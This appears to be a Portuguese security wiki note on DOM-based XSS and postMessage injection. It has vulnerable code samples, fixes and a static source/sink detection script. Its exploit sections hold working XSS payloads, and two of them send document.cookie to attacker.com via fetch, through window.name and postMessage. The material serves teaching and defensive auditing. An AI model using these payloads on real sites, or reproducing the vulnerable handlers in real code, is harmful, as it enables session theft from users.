# DOM-Based XSS & postMessage

**Tags:** #medio #alto #xss #dom #javascript #client-side
**OWASP:** A03:2021 — Injection
**CVSS Base:** 6.1 (Médio) → 8.2 (Alto — com CORS/postMessage sem restrição)

---

## 📖 O que é

**DOM-Based XSS:** o payload nunca vai ao servidor — flui de uma *source* DOM (URL, hash, referrer) diretamente para um *sink* DOM (innerHTML, eval) no browser da vítima.

**postMessage Injection:** quando `window.addEventListener('message', ...)` não valida a origem do remetente, qualquer página pode enviar dados que são processados como código.

---

## 🔍 `grep_search` Táticas

```
# Sources DOM — onde o input entra
location.hash
location.search
location.href
document.URL
document.referrer
window.name

# Sinks DOM — onde a execução ocorre
innerHTML
outerHTML
document.write(
document.writeln(
eval(
setTimeout(str
setInterval(str
element.src =
.href = 
insertAdjacentHTML

# postMessage
addEventListener('message'
addEventListener("message"
window.addEventListener
postMessage
```

---

## 💣 DOM-Based XSS — Exemplos

### Via `location.hash`

```javascript
// ❌ VULNERÁVEL — hash direto para innerHTML
const search = location.hash.slice(1);  // #<script>alert(1)</script>
document.getElementById('output').innerHTML = search;  // SINK PERIGOSO
```

**Exploit:**
```
http://target.com/page#<img src=x onerror=alert(document.cookie)>
```

### Via `location.search`

```javascript
// ❌ VULNERÁVEL — query string para document.write
const params = new URLSearchParams(location.search);
const name = params.get('name');
document.write('<h1>Olá ' + name + '</h1>');  // SINK PERIGOSO
```

**Exploit:**
```
http://target.com/?name=<script>alert(1)</script>
```

### Via `document.referrer`

```javascript
// ❌ VULNERÁVEL
const referrer = document.referrer;
document.getElementById('back').innerHTML = 'Voltar para: ' + referrer;
```

**Exploit:** configurar uma página em um domínio controlado que redireciona para target.com com payload no Referer.

### Via `window.name`

```javascript
// ❌ VULNERÁVEL — window.name persiste entre navegações
document.getElementById('msg').innerHTML = window.name;
```

**Exploit:**
```html
<!-- Em página controlada -->
<script>
window.name = "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>";
location = "https://target.com/vulnerable-page";
</script>
```

---

## 💣 postMessage sem Validação de Origin

### Código Vulnerável

```javascript
// ❌ CRÍTICO — qualquer origem pode enviar mensagens executadas
window.addEventListener('message', (event) => {
    // Sem verificação de event.origin!
    eval(event.data);                              // RCE DOM
});

window.addEventListener('message', (event) => {
    document.getElementById('content').innerHTML = event.data;  // XSS DOM
});

window.addEventListener('message', (event) => {
    const config = JSON.parse(event.data);
    location.href = config.redirectUrl;            // Open Redirect
});
```

### Exploit de postMessage

```html
<!-- evil.html em http://attacker.com -->
<iframe src="https://target.com/app" id="victim-frame"></iframe>
<script>
    // Esperar o iframe carregar
    document.getElementById('victim-frame').onload = function() {
        const frame = document.getElementById('victim-frame').contentWindow;
        
        // Injetar script via postMessage
        frame.postMessage("fetch('https://attacker.com/?c='+document.cookie)", '*');
        
        // Ou XSS via innerHTML
        frame.postMessage('<img src=x onerror=alert(document.domain)>', '*');
    };
</script>
```

---

## ✅ Correção

### DOM-Based XSS

```javascript
// ✅ CORRETO — usar textContent em vez de innerHTML
const name = new URLSearchParams(location.search).get('name');
document.getElementById('output').textContent = name;  // escapa automaticamente

// ✅ CORRETO — sanitizar se innerHTML for necessário
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(userInput);
element.innerHTML = safe;
```

### postMessage com Validação de Origin

```javascript
// ✅ CORRETO — whitelist de origens confiáveis
const TRUSTED_ORIGINS = new Set([
    'https://app.mycompany.com',
    'https://admin.mycompany.com',
]);

window.addEventListener('message', (event) => {
    // Verificar SEMPRE a origem antes de processar
    if (!TRUSTED_ORIGINS.has(event.origin)) {
        console.warn('Origem não confiável rejeitada:', event.origin);
        return;
    }
    
    // Processar apenas após validação
    const data = JSON.parse(event.data);
    // → nunca usar eval() com event.data
    displayContent(data.text);  // função segura, sem eval ou innerHTML
});
```

---

## 🧪 Script de Detecção Estática

```python
# .tmp/find_dom_xss.py
import re, os

DOM_SOURCES = [
    'location.hash', 'location.search', 'location.href',
    'document.URL', 'document.referrer', 'window.name'
]

DOM_SINKS = [
    'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
    r'\beval\(', r'setTimeout\([^,]+,', r'setInterval\([^,]+,',
    'insertAdjacentHTML', '.src =', '.href ='
]

JS_EXTENSIONS = ('.js', '.ts', '.jsx', '.tsx', '.html', '.htm')

findings = []

for root, dirs, files in os.walk('.'):
    # Excluir node_modules
    dirs[:] = [d for d in dirs if d not in ['node_modules', '.git', 'dist']]
    
    for file in files:
        if not file.endswith(JS_EXTENSIONS):
            continue
        
        path = os.path.join(root, file)
        try:
            content = open(path, encoding='utf-8', errors='ignore').read()
            lines = content.split('\n')
            
            for i, line in enumerate(lines, 1):
                has_source = any(src in line for src in DOM_SOURCES)
                has_sink = any(re.search(sink, line) for sink in DOM_SINKS)
                
                if has_source or has_sink:
                    findings.append((path, i, line.strip()))
        except Exception:
            pass

print(f"=== DOM XSS Source/Sink Analysis ===\n")
for path, line_num, line in findings[:50]:
    print(f"{path}:{line_num}: {line[:100]}")
```

---

## 🔗 Chain Exploits

```
DOM XSS via hash → Link enviado por phishing → Roubo de session sem XSS stored
postMessage sem origin → iframe em domínio do atacante → Exfiltração cross-origin
DOM XSS + localStorage com sensitive data → Roubo de tokens persistentes
postMessage + window.location = data → Open Redirect encadeado → OAuth phishing
DOM Clobbering → Named form elements sobrescrevem vars globais → XSS via legado
```

---

## 📌 Referências
- [[XSS — Cross-Site Scripting]]
- [[CORS Misconfiguration]]
- [[HTTP Security Headers]]
- [[Open Redirect]]
- [PortSwigger DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
